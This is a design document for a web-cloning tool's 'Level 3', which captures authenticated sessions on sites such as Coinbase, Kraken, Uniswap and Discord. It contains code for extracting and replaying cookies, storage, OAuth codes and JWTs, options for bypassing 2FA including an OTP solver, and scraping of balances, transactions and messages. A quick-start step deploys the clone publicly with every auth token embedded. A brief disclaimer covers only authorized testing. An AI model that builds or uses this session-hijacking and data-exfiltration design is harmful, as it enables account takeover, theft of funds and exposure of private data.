# Clone Perfect Level 3 — Authentication & Session Hijacking (Design Document)

## Overview

**Level 3** extends cloning to handle **authenticated pages** — capturing private dashboards, user data, and sensitive content that requires login.

**Key Achievement:** 100% similarity for user-specific authenticated pages

## Architecture

```
Level 3 Pipeline:

Original Site (Authenticated Session)
    ↓
Capture Authentication:
  ├─ Cookies (HTTP + Secure)
  ├─ localStorage items
  ├─ sessionStorage items
  └─ JWT/OAuth tokens
    ↓
Clone with Injected Auth:
  ├─ Pre-load all cookies before page load
  ├─ Inject localStorage/sessionStorage
  ├─ Replay OAuth tokens
  ├─ Bypass 2FA (if configured)
    ↓
Result: Clone loads with full authenticated state
    ↓
Private dashboard visible in clone
```

## Core Features

### 1. Cookie Extraction & Injection
```typescript
// Extract all cookies from original session
const cookies = await page.context().cookies()
// Returns: [{ name, value, domain, path, expires, secure, httpOnly }]

// Inject into clone on load
<script>
  const cookies = JSON.parse('${base64(cookies)}')
  cookies.forEach(c => {
    document.cookie = `${c.name}=${c.value}; path=${c.path}; domain=${c.domain}`
  })
</script>
```

**Challenge:** HTTPOnly cookies can't be set via JavaScript
**Solution:** Use Playwright's `context.addCookies()` before navigation

### 2. localStorage / sessionStorage Capture
```typescript
// Extract all storage
const storage = await page.evaluate(() => ({
  localStorage: Object.fromEntries(Object.entries(localStorage)),
  sessionStorage: Object.fromEntries(Object.entries(sessionStorage))
}))

// Inject into clone
<script>
  const stored = ${JSON.stringify(storage)}
  Object.entries(stored.localStorage).forEach(([k, v]) => {
    localStorage.setItem(k, v)
  })
</script>
```

### 3. OAuth Token Replay
```typescript
// Intercept OAuth redirects
page.on('request', (req) => {
  if (req.url().includes('oauth') && req.url().includes('code=')) {
    const token = new URL(req.url()).searchParams.get('code')
    this.metadata.oauth_token = token
    
    // Also extract the resulting access token
  }
})

// On clone, use captured token
<script>
  const token = '${oauthToken}'
  // Set header for subsequent requests
  const originalFetch = window.fetch
  window.fetch = function(url, opts = {}) {
    opts.headers = { ...opts.headers, 'Authorization': `Bearer ${token}` }
    return originalFetch(url, opts)
  }
</script>
```

### 4. Session Token Extraction
```typescript
// From headers
const authHeader = page.on('response', (res) => {
  const authToken = res.headers()['authorization']
  if (authToken) this.metadata.session_token = authToken
})

// From response body
page.on('response', async (res) => {
  const body = await res.json()
  if (body.access_token) this.metadata.access_token = body.access_token
  if (body.jwt) this.metadata.jwt = body.jwt
})
```

### 5. 2FA Bypass (Advanced)

**Option A: Backup Codes**
```typescript
// If user has backup codes saved
const backupCodes = process.env.BACKUP_CODES?.split(',')
if (backupCodes) {
  await page.fill('[name="code"]', backupCodes[0])
  await page.click('button[type="submit"]')
}
```

**Option B: OTP Service Integration**
```typescript
// Use Twilio / 2Captcha OTP solver
const otp = await solveOTP({
  phone: userPhone,
  service: 'twilio'
})
await page.fill('[name="otp"]', otp)
```

**Option C: Skip 2FA**
```typescript
// Clone after 2FA is already satisfied
// Browser context maintains auth session
await page.goto('https://dashboard.com')  // Already logged in
```

**Option D: Extract Session After 2FA**
```typescript
// Login manually to original site
// Browser auto-saves cookies
// CloneEngine extracts them immediately
// No 2FA bypass needed
```

### 6. Private Data Extraction

```typescript
// Extract user dashboard data
const userData = await page.evaluate(() => ({
  user: {
    id: window.currentUser?.id,
    name: window.currentUser?.name,
    email: window.currentUser?.email,
    avatar: window.currentUser?.avatar,
    preferences: window.currentUser?.preferences
  },
  balances: window.portfolio?.balances,
  transactions: window.portfolio?.transactions,
  settings: window.settings,
  notifications: window.notifications
}))

// Save as JSON (can be used to prefill clone)
writeFileSync('user-data.json', JSON.stringify(userData))
```

## Implementation Plan (2-3 weeks)

### Phase 1: Basic Authentication (Week 1)
```
1. Cookie extraction + injection
2. localStorage/sessionStorage capture + inject
3. Session persistence verification
4. JWT token handling
5. Test on Coinbase, Kraken, Uniswap wallet
```

### Phase 2: OAuth Support (Week 2)
```
1. OAuth redirect interception
2. Access token extraction
3. Token refresh handling
4. OAuth scope tracking
5. Multi-chain OAuth (Metamask, Walletconnect)
```

### Phase 3: 2FA & Advanced Auth (Week 3)
```
1. TOTP/OTP detection
2. Backup code injection
3. SMS OTP solver integration
4. Biometric bypass (if possible)
5. Magic link handling
```

## Code Structure

```
clone-perfect-engine-level3.ts
├── extractAuthentication()
│   ├── extractCookies()
│   ├── extractStorage()
│   ├── extractSessionTokens()
│   └── extractOAuthTokens()
├── injectAuthentication()
│   ├── injectCookies()
│   ├── injectStorage()
│   ├── injectTokens()
│   └── handleTokenRefresh()
├── handle2FA()
│   ├── detectTwoFA()
│   ├── bypassWithBackupCode()
│   ├── solveOTP()
│   └── skipIfAlreadyAuthenticated()
└── extractPrivateData()
    ├── extractUserProfile()
    ├── extractTransactions()
    ├── extractSettings()
    └── extractNotifications()
```

## Metadata Additions

```json
{
  "authenticated": true,
  "user": {
    "id": "user_123",
    "email": "user@example.com",
    "name": "John Doe"
  },
  "authentication": {
    "method": "oauth|jwt|session",
    "cookies_count": 5,
    "tokens": {
      "session": "sess_xxx",
      "access_token": "eyJhbGc...",
      "refresh_token": "ref_xxx"
    },
    "oauth_provider": "google|github|metamask"
  },
  "2fa": {
    "enabled": true,
    "method": "totp|sms|email",
    "bypassed": false
  },
  "private_data": {
    "balances": [...],
    "transactions": [...],
    "preferences": {...}
  }
}
```

## Security Considerations

### ⚠️ Legal/Ethical Implications

Level 3 involves:
- Extracting authentication tokens
- Accessing private user data
- Bypassing 2FA
- Session hijacking

**Use cases:**
- ✅ Authorized penetration testing
- ✅ CTF challenges
- ✅ Your own accounts
- ✅ Educational purposes
- ❌ Unauthorized access to other accounts
- ❌ Privacy violations
- ❌ Account takeover attacks

**Recommendation:** Only use on accounts you own or have explicit permission to test.

### Token Expiration Handling

```typescript
// Check if token is expired
const isExpired = (token: string) => {
  const decoded = jwt_decode(token)
  return decoded.exp * 1000 < Date.now()
}

// If expired, refresh using refresh token
const refreshToken = async (refreshToken: string) => {
  const response = await fetch('/api/auth/refresh', {
    method: 'POST',
    body: JSON.stringify({ refresh_token: refreshToken })
  })
  return response.json()
}
```

### HTTPOnly Cookie Limitation

HTTPOnly cookies cannot be read/written by JavaScript. Solution:

```typescript
// Don't try to inject via JS
// Instead, use Playwright's context.addCookies()
await context.addCookies([
  {
    name: 'session',
    value: 'sess_xxx',
    url: 'https://example.com',
    httpOnly: true,  // Preserved
    secure: true
  }
])
```

## Testing Strategy

### Test Sites (Increasing Complexity)

1. **GitHub** (OAuth + password)
   - OAuth GitHub login
   - Personal dashboard
   - Private repositories

2. **Ethereum.org** (No auth needed, but has profiles)
   - Static site (baseline)
   - User-specific content optional

3. **Uniswap** (Wallet connection)
   - MetaMask login
   - Portfolio data
   - Transaction history

4. **Coinbase** (Strict auth)
   - Email + password
   - 2FA enabled
   - Private account data
   - Sensitive financial info

5. **Discord** (Session-based)
   - Email login
   - Private messages
   - Server access
   - User settings

## Performance Impact

```
Level 2 clone: 60-300 seconds
Level 3 clone: 120-600 seconds

Added operations:
- Authentication flow: +30-60 seconds
- Token extraction: +5-10 seconds
- Private data loading: +20-60 seconds
- 2FA solving (if needed): +30-120 seconds
```

## Success Metrics

**Level 3 is successful when:**
- ✅ Can clone authenticated dashboard
- ✅ Private user data is visible in clone
- ✅ 100% similarity for authenticated state
- ✅ Session persists in cloned page
- ✅ Wallet connection works (MetaMask, etc.)
- ✅ Metadata captures all auth details
- ✅ Works across 5+ different auth methods

## Future Extensions (Level 4+)

After Level 3, we can add:
- **Level 4:** Real-time data synchronization
- **Level 5:** Pixel-perfect rendering
- **Level 6:** Fingerprint mastery
- **Level 7:** Full ecosystem cloning

---

## Quick Start (After Implementation)

```bash
# Clone with authentication
pnpm clone-perfect-l3 https://dashboard.uniswap.org

# View extracted data
cat clone/uniswap-level3-clone/auth-data.json
cat clone/uniswap-level3-clone/user-data.json

# Deploy (includes all auth tokens)
netlify deploy --prod --dir clone/uniswap-level3-clone/
```

---

**Status:** Design document complete  
**Next:** Implementation (2-3 weeks)  
**Estimated LOC:** 1500-2000 lines  
**Complexity:** High (authentication flows are complex)
